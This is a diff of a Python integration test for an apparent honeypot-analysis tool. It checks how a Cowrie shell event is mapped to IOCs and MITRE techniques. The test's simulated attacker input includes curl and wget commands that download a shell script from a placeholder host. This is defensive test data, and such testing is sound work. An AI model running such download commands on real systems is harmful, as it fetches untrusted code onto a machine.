@@ -161,7 +161,7 @@ class CollaborativeIntegrationTests(fixtures.AuthFixture):
     def test_model_findings_and_review_remain_visible_with_supported_mitre_only(self):
         self.enroll(93,admin=True)
         url = 'https://evidence.corp.local/tool.sh?arg=1'
-        raw = self.event(input=f"printf bundles.zip; curl '{url}'")
+        raw = self.event(input=f"wget -O bundles.zip '{url}'")
         event_id = self.ingest([raw])['confirmaciones'][0]['id_evento']
         e = app.state.tables['evento']
         sid = self.connection.scalar(select(e.c.id_sesion).where(e.c.id_evento==event_id))
@@ -171,7 +171,7 @@ class CollaborativeIntegrationTests(fixtures.AuthFixture):
                       IocProposal(tipo='URL',valor=url.split('?')[0],evento=event_id),
                       IocProposal(tipo='URL',valor=url,evento=event_id+1000),
                       IocProposal(tipo='URL',referencia=2,evento=event_id)],
-                mitre=[MitreProposal(codigo='T1059.004',codigo_tactica='TA0002',justificacion='Comando escrito en la shell emulada, sin prueba de ejecucion en Ubuntu real',limitaciones=['La shell de Cowrie es emulada y requiere revision humana'],confianza=0.8),
+                mitre=[MitreProposal(codigo='T1105',codigo_tactica='TA0011',eventos=[event_id],comportamiento_observado='Orden de descarga introducida',justificacion='Comando de descarga escrito en Cowrie, sin prueba de ejecución del archivo',limitaciones=['El registro contiene un intento de descarga sin confirmación.'],confianza=0.8),
                        MitreProposal(codigo='T1078',justificacion='Propuesta no permitida en este laboratorio',confianza=0.5)]),
             Finding(tipo='otra acción',descripcion='Mismo evento asociado',confianza=0.7,eventos=[event_id],
                 iocs=[IocProposal(tipo='URL',valor=url,evento=event_id)])])
